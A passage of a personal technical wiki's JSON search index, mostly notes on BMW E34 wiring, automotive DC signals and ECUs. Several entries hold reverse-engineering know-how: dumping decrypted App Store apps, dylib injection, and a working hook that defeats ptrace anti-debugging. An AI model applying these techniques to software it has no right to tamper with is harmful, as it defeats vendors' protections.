        "content": "This document presents Input/Output (IO) stages of signals and sensors in DC Digital Voltage.\nTransistor Final Stage Function Transistor takes on a number of applications that must be understood to effectively analyze a circuit. Transistor during the operation, functions as two parts, much like a relay Both the Relay and the Transistor controls high currents with low current signal Functions of Transistors, and Relays are similar, as can be seen above The transistor consists of three (3) major sections:\nBase Emitter Collector The Base/Emitter functions as the control circuit, activated by the Control Module, to oversee or control the work. The Collector/Emitter functions as the work side of the circuit, supplying power, or switching to work operation During the operation, the transistor can either be switched ON momentarily; can be supplied a constant power (+) or ground (-). Additionally, the transistor can also be either modulated, or fowarded to supply a modulated square wave signal.\nI/O both from and to Control Module via Transistor Modulated, Momentary, Constant B- as Input/Output Lets take an example:\nThe input signal of Control Module \u0026ldquo;1\u0026rdquo; is an output signal of Control Module \u0026ldquo;2\u0026rdquo;. Control Module \u0026ldquo;2\u0026rdquo;, through activation of its internal transistor, provides a ground input for Control Module \u0026ldquo;1\u0026rdquo;. The input signal at Control Module \u0026ldquo;1\u0026rdquo; is either a momentary/constant signal (i.e. torque convertor signal from TCM to DME), or a modulated signal (i.e. vehicle speed signal ASC to DME). I/O Stages, as used by Control Module {1, 2}. CM{2} can use, and control Input Signal from CM{1} Momentary, Constant B+ as Input/Output Signal Lets take an example:\nThe input of Control Module \u0026ldquo;2\u0026rdquo; is controlled by Control Module \u0026ldquo;1\u0026rdquo; Control Module \u0026ldquo;2\u0026rdquo; is possible for control through Control Module \u0026ldquo;1\u0026rdquo; through internal activation of the transistor Control Module \u0026ldquo;1\u0026rdquo; provides power for the input circuit of Control Module \u0026ldquo;2\u0026rdquo; I/O Stages, as used by Control Module {1, 2}. CM{1} can use, and control Input Signal from CM{2} Constant B-/B+ to Energize a Component Energizing a component means increasing, storing or providing electrical voltage, or current ot a component.\nConstant B- Output function to energize a component. Relay is energized by activation of the transistor inside the module. The transistor provides a ground for the relay coil, related to Control Module.\nEnergizing a Component, using const. B- signal Constant B+ Control Module output function to energize a component. Transistor controls output function of the Control Module. Control Module supplies power to the Relay. The relay is activated by the Control Module, through activation of the transistor which provides a ground for the Relay coil.\nEnergizing a Component, using const. B\u0026#43; signal Modulated B-/B+ To Operate a Component Modulated B- Output function to operate a component. The idle valve motor is operated by the Control Module through activation of the transistor which provides a ground for the open winding of the valve.\nOperate a Component, using const. B- signal Modulated B+ Output function to operate a component. The motor is controlled by a transistorized function of the Control Module. It provides a modulated voltage, at a specific frequency to the motor. The throttle position is changed by altering the Duty Cycle of the pulses.\nOperate a Component, using const. B- signal ", 
        "url": "\/dc-digital-io-stages\/"
    },
    
    
    
    "\/dc-digital-sensors\/": {
        
        "title": "DC Digital Sensors",
        "tags": [],
        "content": " Hall Effect Sensors Magnetoresistive Sensors Designated Value Signals Coded Ground Signals Transistor Signals ", 
        "url": "\/dc-digital-sensors\/"
    },
    
    
    
    "\/dc-voltage-signals\/": {
        
        "title": "DC Voltage Signals",
        "tags": [],
        "content": "Types of DC Voltage Signals Five Types of DC Voltage Signals are used:\nAnalog Signals Digital Signals Designated Value Signals Coded Ground Signals Transistor Signals DC Voltage Signals are based on either 5 Volts or 12 Volts.\nDC Voltage Signals DC Analog Signals Analog signals transmit information through an electrical circuit by regulating or changing the current or voltage.\nThree (3) sources of analog signals are:\nNTC Sensors - Negative Temperature Coefficient PTC Sensors - Positive Temperature Coefficient Potentiometers Read more about NTC/PTC Troubleshooting for potential problems in wiring and schema understanding.\nDC Digital Signals Digital Signals transfer information through electrical circuit, by switching the current ON (1) or OFF (0).\nUnlike Analog Signals which uses voltage, a digital signal has only two possible states, control voltage (1) or zero voltage (0).\nDC Digital Signals Two (2) types of Digital Signals:\nSwitched (High) Signals - B+ Switched (Low) Signals - B- Modulated Square Wave Signals Designated Value Signals The page has been moved to dedicated page \u0026ldquo;Designated Value Signals\u0026rdquo;, of topic DC Digital Sensors.\nCoded Ground Signals The page has been moved to dedicated page \u0026ldquo;Coded Ground Signals\u0026rdquo;, of topic DC Digital Sensors.\nTransistor Signals The page has been moved to dedicated page \u0026ldquo;Transistor Signals\u0026rdquo;, of topic DC Digital Sensors.\n", 
        "url": "\/dc-voltage-signals\/"
    },
    
    
    
    "\/debug\/": {
        
        "title": "Debugs",
        "tags": [],
        "content": "", 
        "url": "\/debug\/"
    },
    
    
    
    "\/decrypt-ipa-from-appstore\/": {
        
        "title": "Decrypt IPA from AppStore",
        "tags": [],
        "content": "Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.\n# =\u0026gt; Start iproxy $ iproxy 2222 22 # =\u0026gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =\u0026gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... ", 
        "url": "\/decrypt-ipa-from-appstore\/"
    },
    
    
    
    "\/designated-value-signals\/": {
        
        "title": "Designated Value Signals",
        "tags": [],
        "content": "Designated Values are produced through fixed resistance positions of a multi-position switch.\nAs the switch is operated, the voltage drop across the resistor(s) of each switch position causes the voltage level of the input signal to change to a predetermined (designated, fixed, constant) voltage value.\nThese predetermined (designated) voltage signals the Control Module to perform specific functions.\nDesignated Value Signals viewed in Oscilloscope Below is an example diagram showing a Control Module unit with internal resistor, using Input Signal (predetermined voltage values). In a Switch Function, a constant resistor values are shown, which causes the operation flow to execute depending on the resistance value.\nDiagram showing Designed Value Signal switch with predefined Resistor Ohm Values ", 
        "url": "\/designated-value-signals\/"
    },
    
    
    
    "\/din\/": {
        
        "title": "DIN",
        "tags": [],
        "content": "There is a terminal designation for almost every connection of a consumer or switch in the vehicle in order to facilitate the connection. The designation of the individual connections is defined in Germany, according to DIN 72552. The table below shows an excerpt of the most important connections from this DIN.\nDIN 72552 is a DIN (Deutsches Institut f√ºr Normung) standard for labeling the electric terminals in automotive wiring. Visit this Wikipedia Link to learn more about this standard.\nThe column \u0026ldquo;Contact\u0026rdquo; is refering to a clamp of the connection (consumer), or a switch.\nContact Meaning Ignition system 1 ignition coil, distributor, low voltage 1a, 1b distributor with two separate circuits 2 breaker points magneto ignition 4 coil, distributor, high voltage 4a, 4b distributor with two separate circuits, high voltage 7 terminal on ballast resistor, to distributor 15 battery+ from ignition switch 15a from ballast resistor to coil and starter motor 15e battery+ from ignition switch, also when starter motor runs Preheat (Diesel engines) 15 preheat in 17 start 19 preheat (glow) Starter 45 starter relay 45a starter 1 output 45b starter 2 output 50 starter control 50a starter control 50b starter control 50c starter control 50d starter control 50e starter control 50f starter control 50g starter control 50h starter control Battery 15 battery+ through ignition switch 30 from battery+ direct 30a from 2nd battery and 12/24 V relay 31 return to battery- or direct to ground 31a return to battery- 12/24 V relay 31b return to battery- or ground through switch 31c return to battery- 12/24 V relay Electric motors 32 return 33 main terminal (swap of 32 and 33 is possible) 33a limit 33b field 33f 2. slow rpm 33g 3. slow rpm 33h 4. slow rpm 33L rotation left 33R rotation right Indicators 49 flasher unit in 49a flasher unit out, indicator switch in 49b out 2. flasher circuit 49c out 3. flasher circuit C 1st flasher indicator light C2 2nd flasher indicator light C3 3rd flasher indicator light L indicator lights left R indicator lights right L54 lights out, left R54 lights out, right AC generator 51 DC at rectifiers 51e as 51, with choke coil 59 AC out, rectifier in, light switch 59a charge, rotor out 64 generator control light Generator, voltage regulator 61 charge indicator (charge control light) B+ battery + B- battery - D+ dynamo/alternator diode+ D- dynamo/alternator diode- DF dynamo field DF1 dynamo field 1 DF2 dynamo field 2 U, V, W AC three phase terminals Lights 54 brake lights 54g lights 55 fog light 56 spot light 56a headlamp high beam and indicator light 56b low beam 56d signal flash 57 parking lights 57a parking lights 57L parking lights left 57R parking lights right 58 licence plate lights, instrument panel 58d panel light dimmer 58L parking light 58R parking light Window wiper/washer 53 wiper motor + in 53a limit stop + 53b limit stop field 53c washer pump 53e stop field 53i wiper motor with permanent magnet, third brush for high speed Acoustic warning 71 beeper in 71a beeper out, low 71b beeper out, high 72 hazard lights switch 85c hazard sound on Switches 81 opener 81a 1 out 81b 2 out 82 lock in 82a 1st out 82b 2nd out 82z 1st in 82y 2nd in 83 multi position switch, in 83a out position 1 83b out position 2 Relay 85 relay coil - 86 relay coil + Relay contacts 87 common contact 87a normally closed contact 87b normally open contact 88 common contact 2 88a normally closed contact 2 88b normally open contact 2 Additional 52 signal from trailer 54g magnetic valves for trailer brakes 75 radio, cigarette lighter 77 door valves control ", 
        "url": "\/din\/"
    },
    
    
    
    "\/dyld-ios-injection\/": {
        
        "title": "DYLD iOS Injection",
        "tags": [],
        "content": "Inject dylib (Library) into iOS process\n$ cat SomeLibrary.c # ... SomeLibrary codebase ... $ gcc -dynamiclib SomeLibrary.c -o SomeLibrary.dylib -Wall\t// Compile iOS dylib $ DYLD_INSERT_LIBRARIES=SomeLibrary.dylib cat 1\t// Works only on CLI programs, not Apps. ", 
        "url": "\/dyld-ios-injection\/"
    },
    
    
    
    "\/dyld-macos-injection\/": {
        
        "title": "DYLD MacOS Injection",
        "tags": [],
        "content": "Tracing MacOS app. via CLI\n$ dtruss /Application/AppName.app/Contents/MacOS/AppName $ dtrace /Application/AppName.app/Contents/MacOS/AppName Print MacOS Logs from Terminal\n$ idevicesyslog Inject dylib (Library) into MacOS process\n$ gcc -dynamiclib SomeLibrary.c -o SomeLibrary.dylib # compile dylib $ DYLD_INSERT_LIBRARIES=SomeLibrary.dylib /Application/AppName.app/Contents/MacOS/AppName Analyse MacOS binary for ObjC runtime/environ variables\n$ OBJC_HELP=1 ./build/Debug/HelloWorld ## More Below: # objc: OBJC_HELP: describe Objective-C runtime environment variables # objc: OBJC_PRINT_OPTIONS: list which options are set # objc: OBJC_PRINT_IMAGES: log image and library names as the runtime loads them Anti-debugging techniques implemented in XNU/OSX environments\nvia sysctl() \u0026amp; P_TRACED flag detected (can detect debugger and tracer, but not injection and cycript) via isatty() which returns \u0026lsquo;1\u0026rsquo; if the given file descriptor is attached to the debugger, otherwise \u0026lsquo;0\u0026rsquo; via task_get_exception_ports, which detects debuggers exception port via Restricted section of an executable (setgid bits are set, __restrict section), prohibits dylib injection Bypass Restricted section name to allow DYLIB injection\n$ ldid -S #APP $ codesign ... Bypass ptrace based anti-debugging of a MacOS app. (Easy)\n#import \u0026lt;dlfcn.h\u0026gt; #import \u0026lt;sys/types.h\u0026gt; typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data); #if !defined(PT_DENY_ATTACH) #define PT_DENY_ATTACH 31 #endif // !defined(PT_DENY_ATTACH) void disable_debugging() { void* handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW); ptrace_ptr_t ptrace_ptr = dlsym(handle, \u0026#34;ptrace\u0026#34;); ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0); dlclose(handle); } /** to bypass the above \u0026#39;ptrace\u0026#39; syscall, we can abuse the MacOS DYLD_INSERT_LIBRARIES */ /** @see below (the dylib works for both easy/hard impls.) */ Bypass ptrace based anti-debugging of a MacOS app. (Hard)\n// pseudo-code of an MacOS app. that triggers \u0026#39;ptrace\u0026#39; (PT_DENY_ATTACH) (31) int start(int a1) { ... v1 = a1; v2 = dlopen(0LL, 0xA); v3 = v2; v4 = dlsym(v2, \u0026#34;ptrace\u0026#34;); ((void (__fastcall *)(signed __int64, _QWORD, _QWORD, _QWORD))v4)(31LL, 0LL, 0LL, 0LL); dlclose(v3); ... return 0LL; } /** to bypass the above \u0026#39;ptrace\u0026#39; syscall, we can abuse the MacOS DYLD_INSERT_LIBRARIES */ /** which can be injected using LD_PRELOAD on Linux and Unix. Hooking is possible right */ /** from the library code we will inject */ // gcc -dynamiclib hook.c -o hook.dylib // DYLD_INSERT_LIBRARIES=hook.dylib /Application/AppName.app/Contents/MacOS/AppName #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; typedef long int (*org_ptrace)(int, pid_t, void *, void *); // original ptrace signature long int ptrace(int request, pid_t pid, void *addr, void *data) { printf(\u0026#34;ptrace [request]: %d\\n\u0026#34;, request); if (request == 31) { // detect PT_DENY_ATTACH request return 0; // early exit } org_ptrace pt = (org_ptrace)dlsym(RTLD_NEXT, \u0026#34;ptrace\u0026#34;); puts(\u0026#34;org_ptrace call\u0026#34;); return pt(request, pid, addr, data); // otherwise call original ptrace } ", 
        "url": "\/dyld-macos-injection\/"
    },
    
    
    
    "\/e34-cluster-wiring-diagram\/": {
        
        "title": "E34 Cluster Wiring Diagram",
        "tags": [],
        "content": "Hint: Use right-click, \u0026ldquo;Open Image in New Tab\u0026rdquo; - to see full resolution.\nE34 Low Cluster - EURO - MY. 88-90 Test Bench Wiring E34 Low Cluster, Euro, MY. \u0026lt; \u0026#39;90 - Test Bench For this cluster, there are available pinouts for the sensors and signals.\nAdditionally, to trigger \u0026ldquo;Coolant Temperature Sensor\u0026rdquo;, put the Pin 4 of X16 to Ground.\nTo trigger \u0026ldquo;Fuel Level Warning Light\u0026rdquo;, make sure to put Pin 3 of X13060 to Ground. Along side, set Pin 14 (\u0026ldquo;Fuel Level Signal\u0026rdquo;) to Ground as well.\nE34 Low Cluster - EURO - MY. 88-90 Repair Matrix Testing, Repairing and Replacing Instrument Cluster (Matrix) E34 Low Cluster - EURO - MY. 90-94 Board Diagnose Switch off the ignition, press and hold the distance kilometer reset button, then switch the ignition key to position 1, the button can now be released.\nThe result is shown:\n01 BMW part no. 02 Code No. (coding plug) 03 K No. (tacho code) 04 last 7 digits of the FGSTNR 05 Software Version 06 Revision Index, Hardware No. 07 Cluster Test ", 
        "url": "\/e34-cluster-wiring-diagram\/"
    },
    
    
    
    "\/e34-misc-wiring\/": {
        
        "title": "E34 Misc Wiring",
        "tags": [],
        "content": "Valuable Schema Diagrams 0670-0, represent the power distribution (fuse box in the engine compartment and equipment carrier at the rear) 0670-3, the details of the fuse 0670-4, the ground distributors of all consumers 0670-5, the diagnostic connection in the circuit diagrams of the various control units. The supply voltage, fuses, and ground connections are not listed in detail 7000, lists all connectors, if necessary with image references and specifications of the connector type 7100, installation location of various plugs and components in the form of images 8000, overview of the plug connections of the main cable harnesses 8500, list all plug connectors with regard to shape and number of poles how-to schema readings: (Example)\nQ: How does the MF clock get the Ignition Switch signal (Terminal R)? Circuit diagram for MF clock (6213-2/page 1) shows a plug X501 and goes to fuse F1 via Terminal R (Switching Plus). More at 0670.3 Connector X501 (7000/page 29) shows location of X501 (behind the center console), and pin 26, colored green. There is no picture of the position and the plug can be found on 8500/page 1, position 1. On page 0670.3/page 0, if you take a closer look, you will find the N10 module (MF clock) to which the violet-yellow cable you are looking for, i s connected to Pin 8. These colors were not listed in the circuit diagram of the MF clock. It can also be seen that this cable runs via connectors X1428 and X15, to X225, and from there to F1. The switching plus can also be recognized by the designation \u0026ldquo;R\u0026rdquo;, above the safety symbol. When looking further, at the X15 connector, for example, there is an image that shows that the connector is installed to the left of the instrument cluster (under the dashboard). Incidentally, this is where the harness connects across the dash to the rest of the vehicle. The combination insutrment is not attached to it, but the hazard warning lights, the cigarette lighter, the MF clock or the BC are available and the connection for the auxilary heating/ventilation (8-pin). above the glove component can also be seen. In this way, cable color, cable cross-section (the number next to the color), position (often even with picture) and connector type can be determined. Tacho (RPM) Signal Testing the crankshaft sensor\nThe crankshaft sensor (RPM sensor) is mounted on the front face. The speed is measured via the \u0026ldquo;teeth\u0026rdquo; of the wheel. If the DME does not receive any signals, the engine will not start!\nTesting signals is easy as:\nPulling out the plug Measure the resistance value between 1 and 2 with an ohmmeter: M20/M30 : 540 Ohm +- 10% M50/M60 : 1280 Ohm +-10% The distance sensor to \u0026ldquo;teeth\u0026rdquo;:\n1.0 mm (+-0.3mm ) If the resistance value is not correct, then the sensor is defective and the motronic cannot evaluate it.\nSpeed Impulse/Signal With the E34, the speedometer signal is located in the radio connector, as well as dashboard cluster. There is detailed pinout for dashboard cluster. The BMW radio signals are described below, including details for wires.\nTesting the crankshaft sensor\nThe sensor is mounted on the right hand side of the throttle body, and cannot be adjusted. The motronic sends a voltage signal to the potentiometerm and measures the returned voltage. The voltage decreases as the throttle valve opens.\nTest #1 - Measure Voltage at connector:\nPull off connector Ignition on Measure voltage at connector. Target value 5V(DC) (approx.) Test #2 - Measure Ohm of pins:\nPull out the plug Connect an ohmmeter Open the throttle valve and measure the values: Pin 1 to Pin 3: approx. 4.0 KOhm Pin 1 to Pin 2: approx. 1.0 to 4.0 KOhm Note: If you now slowly open the throttle valve, the value must change from 1.0 KOhm to 4.0 KOhm (stop to stop). If this is not the case, replace the potentiometer. Valve cannot be adjusted.\nCell Phone RJ45 Pinout Remove the armest and roll-top box. Locate the RJ45 connector wire up a male RJ45 with the following config: PIN 1 -\u0026gt; Constant +12V on car kit PIN 2 -\u0026gt; Switched +12V on car kit PIN 3 -\u0026gt; Ground on car kit PIN 4 -\u0026gt; Radio Mute on car kit PIN 5 -\u0026gt; Speaker + on car kit PIN 6 -\u0026gt; Speaker - on car kit PIN 7 -\u0026gt; Microphone + on car kit PIN 8 -\u0026gt; Microphone - on car kit\nConnect your male RJ45 to the connector in the console. On the left side of the trunk above the wheel well find the DB25 connector. Using a male DB25 make the following jumper connections: PIN 1 -\u0026gt; PIN 5 (switched +12V) PIN 3 -\u0026gt; PIN 24 (Ground) PIN 4 -\u0026gt; PIN 6 (constant +12V) PIN 8 -\u0026gt; PIN 14 (MIC +) PIN 10 -\u0026gt; PIN 18 (Radio Mute) PIN 11 -\u0026gt; PIN 19 (Speaker -) PIN 12 -\u0026gt; PIN 25 (Speaker +) PIN 14 -\u0026gt; PIN 23 (MIC +)\nConnect your jumper to the DB25 in the trunk. If your car kit has an antenna output connect it to the antenna wire under the console, connect the two antenna wires together in the trunk, and connect your antenna to the wire in the headliner. If you have DSP you may need to apply +12V to the \u0026ldquo;cell phone present\u0026rdquo; signal on the DSP amp. My NAV site details the wiring for this, but I don\u0026rsquo;t have the DB25 PIN assignment for that at this time. If the wire isn\u0026rsquo;t obvious when you do the install then shoot me an email and I\u0026rsquo;ll tear into my connector and let you know. That should just about do it. Your radio should mute when you are on the phone, and your car kit should use the factory audio. BTW the microphone is in the headliner next to the sunroof switch.\nArchived References Refer to AndrewP\u0026rsquo;s Phone Wiring. BMW Radio Pinout Two types of the radio connector exists in BMW E34s:\nConnector on the Radio Multi-plugin Connector They have different pinouts, as shown below:\nPinouts for BMW E34 Radio (Connector, Multiplug) The following table is valid for both versions:\nPin Connection More Info 1 Front Left Speaker + 2 Front Right Speaker + 3 Rear Left Speaker + 4 Phone Mute 5 Positive (+), Terminal R From Ignition Lock Stage 1, +12V 6 Rear Right Speaker + 7 NOT_USED 8 Front Left Speaker - 9 Permanent Positive (+), Terminal 30 10 Speedometer Signal For speed-dependent volume controle 11 Front Right Speaker - 12 Rear Left Speaker - 13 Lighting, Terminal 58g 14 Rear Right Speaker - 15 Ground, Terminal 31 16 Automatic Antenna, (HiFi) Amplifier Switching Output, +12V You can wire BMW speakers with your custom CD-Player, based on the original wires colors (base color, and the stripe color).\nSpeakers wire connection is as the following:\nSpeaker Left Right Front + Yellow Red Blue Red Front - Yellow Brown Blue Brown Rear + Yellow Violet Blue Violet Rear - Yellow Gray Blue Gray \u0026mdash;\u0026mdash;- \u0026mdash;\u0026mdash;- \u0026mdash;\u0026mdash;- Note: for newer generation of BMW vehicles (ie. E38, E39, E46, E53), the assignment is the same, except:\nPin Connection More Info 7 I-Bus The newly introduced Information Bus - Archived References Refer to BMW Radiostecker (pdf) (ext) (archive) for wire color (extended table). For CD Changer, refer to this forum archive, as well as Becker TrafficPro \u0026lt;\u0026gt; BMW Pinout. ", 
        "url": "\/e34-misc-wiring\/"
    },
    
    
    
    "\/e34-pinout-diagram\/": {
        
        "title": "E34 Pinout Diagram",
        "tags": [],
        "content": "Note: if you can\u0026rsquo;t make sense of the \u0026ldquo;Terminal #\u0026rdquo; keywords in the pinouts below, refer to Terminal Designations, and DIN 72552 pages. In short, it represents a standardised/defined/constant Pin I/O.\nE34 Radio Pinouts The BMW Series 5 E34 Radio Pinouts are located here.\nE34 Low Cluster - EURO - MY. 88-90 Pinouts Details:\nCluster: Low (without Check Control - aka CCM) Installed in: 518i M40 (import), 520i M20, 520i M50, 524td Period: until 09/1990 Manufacturer: Motometer Identification Features: - Mechanical km counter in the speedometer - Uneven scaling on the fuel gauge - White back of the instrument cluster - Coding plug (black) is in the back of the station wagon Defects and remedies: Replace the batteries on the circuit board (1.2V mignon). If these have leaked, they have usually already etched the circuit board - the only solution here is to replace them. Pinouts for the particular model (X16/Yellow, X13060/Blue) Download full pinout diagram, showing Connection, Signal Type, and Pin#NO (for High Cluster). Requires MacOS and Numbers.app. Otherwise, here you can download a compiled pdf version.\nClick for Pinouts Diagram Pin Type Description Pin 1 A TxD Diagnostic Line Pin 2 E ABS Indicator Lamp Pin 3 A Brake Fluid Level Pin 4 E Coolant Temperature Sensor Pin 5 A Oil Pressure Signal Pin 6 NOT_USED Pin 7 E Preheating, Diesel Pin 8 SIA (Service Light) Reset Pin 9 Charge Indicator Lamp, Terminal 61 Pin 10 E Start Clear Diesel Pin 11 NOT_USED Pin 12 E RxD Diagnosis Line Pin 13 E NOT_USED Pin 14 A Airbag Lamp Indicator Pin 15 A Ignition Lock Pin 16 A Fuse, Terminal 15, Ignition Pin 17 A Terminal R for Airbag Indicator Lamp Pin 18 A Ground Connection Pin 19 NOT_USED Pin 20 A TI (DME Control Unit) Signal Pin 21 E Fuse, Terminal 30 Pin 22 E Fuse, Terminal R, Accessories Wire (ACC) Pin 23 A Main Beam Indicator Lamp Pin 24 A Turn Signal Indicator Lamp Pin 25 A Fuse, Terminal 15, Ignition Pin 26 E TD Signal ", 
        "url": "\/e34-pinout-diagram\/"
    },
    
    
    
    "\/e34-repair-restoration\/": {
        
        "title": "E34 Repair \u0026 Restoration",
        "tags": [],
        "content": "Please, check Upgradables as well. These show my to-do, and wishlist that I planned for my E34.\nFixing and repairing Cigarette Lighter If the cigarette lighter no longer works, simply bend the two lugs at the rear-end of the socket sligthly inwards, with a plastic rod and it will work again.\nFixing Cluster and Interior Lights Requirement\nTwo type of bulbs (both ending with orange wires) T1 14V/40mA or 14V/60mA (3x6mm) T1 1/4 14V/80mA ~ equates to 1.2W Use T1 14/40mA (or 14/60mA) for: lumbar switch, sport seat switch, old seat heating switch, rear blind switch, memory switch etc.\nUse T1 1/4 80mA for: sunroof switch, automatic program switch, rear window switch, light switch, NSW switch etc.\nUse E34Wiki Table List for all Bulbs that might need replacing.\nOpening doors with a dead battery Use the emergency unlock procedure; work every time with a dead battery.\nTurn passenger lock as to unlock the car, Keep it there, Pull the handle and turn key some more, Release the handle and turn more again, This will unlock your door. ", 
        "url": "\/e34-repair-restoration\/"
    },
    
    
    
    "\/ecu-calibration\/": {
        
        "title": "ECU Calibration",
        "tags": [],
        "content": " ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU How to Calibrate and Adjust Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.a2l) How does it work CCP (CAN Calibration Protocol) XCP (Universal Calibration Protocol) Tools CANape\n", 
        "url": "\/ecu-calibration\/"
    },
    
    
    
    "\/ecu-foundations\/": {
        
        "title": "ECU Foundations",
        "tags": [],
        "content": "ECU Electronic Control Unit the \u0026ldquo;ECU\u0026rdquo; Doing calculations or apply rules in the vehicle system Calculation example of ECU Meassure \u0026ldquo;Speed (km/h)\u0026rdquo; ECU would \u0026ldquo;calculate\u0026rdquo;: - speed (km/h) = wheel (rpm) x 3.6 Apply a tiny part of logic If speed is above 5km/h, then lock the doors ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus) ECU Software Layers\nControl functions that ECU runs are referred to as \u0026ldquo;application software\u0026rdquo;, (ie window control, etc.) (ASW) Network connections of IO of ECU are managed via \u0026ldquo;basic software\u0026rdquo; (like an operating system layer) (BSW) Runtime environment \u0026ldquo;RTE\u0026rdquo; glues both Network and Control functions, takes output from ASW to BSW To update ECU software, we can use UDS and Flash Bootloader a special piece of ECU that updates the firmware Diagnostis OBD protocol (On Board Diagnostics) Use OBD to diagnose ECU\u0026rsquo;s Use XCP and Callibration to Diagnose ECU HCP (New era of ECU\u0026rsquo;s) There is new generation of ECU called high-performance computing platform (HCP) ", 
        "url": "\/ecu-foundations\/"
    },
    
    
    
    "\/electronic-signals\/": {
        
        "title": "Electronic Signals",
        "tags": [],
        "content": "Quick-jump to AC and DC Signals\nPurpose of Electronic Signals Electronic Signals move information like cars move passenger down the highway Signals allow devices (e.g. sensors, or switches) to communicate with Control Modules Such communication can be completed via simple Relays Other times, the communication requires a complicated processor Signals and the modules perform or request (through more signaling) other functions to be carried out Example of Signals\nA Signal can inform the Climate Control the outside air temperature. A Signal can inform the brake lights the right time to illuminate. A Signal can inform the DME to enable ABS due to rain. The use of electronic signals goes far beyond the basic application of electron flow to some components. Electronic signals enables (or allow) complex information to be passed from one component to another.\nThe data (input or output) is exchanged through various forms such is changing voltages, resistance, current or frequency modulation.\nElectronic Signals are divided into two (2) main groups. There is AC Type Signals and DC Type Signals.\n", 
        "url": "\/electronic-signals\/"
    },
    
    
    
    "\/enable-ssh-on-raspbian-os\/": {
        
        "title": "Enable SSH on Raspbian OS",
        "tags": [],
        "content": "Via RO/RW SD Card This seems to work only on Raspbian OS, and not the custom GNU/Linux ARM builds-. To enable SSH on boot, you need to create a new ssh file in your SD Card\u0026rsquo;s /boot partition:\nFirst, make sure to mount the boot partition, as seen on Mounting SBC Operating System.\nNext, create the ssh file:\n$ sudo touch /Volumes/boot/ssh Paswordless SSH Authentication In your Raspberry OS, do the following to generate ~/.ssh defaults:\npi@raspberrypi:~ $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/pi/.ssh/id_rsa): Created directory \u0026#39;/home/pi/.ssh\u0026#39;. ... +---[RSA 3072]----+ ...... +----[SHA256]-----+ Copy the Raspberry OS public key, and place it on your Host OS ~/.ssh/authorized_keys:\n# =\u0026gt; on RPi pi@raspberrypi:~ $ cat ~/.ssh/id_rsa.pub ssh-rsa AAAA.... # =\u0026gt; on Host OS galaxy@devil. ~ vim ~/.ssh/authorized_keys # .. paste the RPi id_rsa.pub .. galaxy@devil. ~ ssh-copy-id pi@raspberrypi.local /usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed ... pi@raspberrypi.local\u0026#39;s password: Number of key(s) added: 1 ... # =\u0026gt; now try logging into the machine, with $ ssh pi@raspberrypi.local You should be able to login without providing Raspberry Pi password.\n", 
        "url": "\/enable-ssh-on-raspbian-os\/"
    },
    
    
    
    "\/encryption-and-cryptography\/": {
        
        "title": "Encryption and Cryptography",
        "tags": [],
        "content": "Quick Decode(s) For JWT use jwt.io, paste your token and enjoy formatted results When having base64 encoded string, simply: echo \u0026quot;\u0026lt;string\u0026gt;\u0026quot; | base64 --decode. When having md5 or equivalent (one-way hash), use hashcat Decoding Unknown Chipers To decode unknown chipers, you will need to take the binary that engages on the encryption/decryption mechanism, and understand the logic flow. It\u0026rsquo;s similar to when you are bypassing a license, except the figurative data is usually hard to understand.\nAutomated Decryption You can try using Ciphey, automated decryption/decoding/cracking tool using natural language processing \u0026amp; artificial intelligence. It\u0026rsquo;s open source and nicely documented.\n$ ciphey Usage: ciphey [OPTIONS] [TEXT_STDIN] Ciphey - Automated Decryption Tool Documentation: https://github.com/Ciphey/Ciphey/wiki ... Examples: Basic Usage: ciphey -t \u0026#34;aGVsbG8gbXkgbmFtZSBpcyBiZWU=\u0026#34; Options: -t, --text TEXT The ciphertext you want to decrypt. -q, --quiet Decrease verbosity -g, --greppable Only print the answer (useful for grep) # =\u0026gt; use -h to display full output Manual Decryption Head over to CyberChef from gchq@gov, and manually craft your chiper recipe or combination. This takes some time, but the chances are much greated then using automated tasks.\nToolset carmaa/interrogate - proof-of-concept tool for identification of cryptographic keys in binary material ", 
        "url": "\/encryption-and-cryptography\/"
    },
    
    
    
    "\/ethernet-specifications\/": {
        
        "title": "Ethernet Specifications",
        "tags": [],
        "content": "Specifications SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable ", 
        "url": "\/ethernet-specifications\/"
    },
    
    
    
    "\/posts\/files\/": {
        
        "title": "Files",
        "tags": [],
        "content": "", 
        "url": "\/posts\/files\/"
    },
    
    
    
    "\/firewall-engagements\/": {
        
        "title": "Firewall Engagements",
        "tags": [],
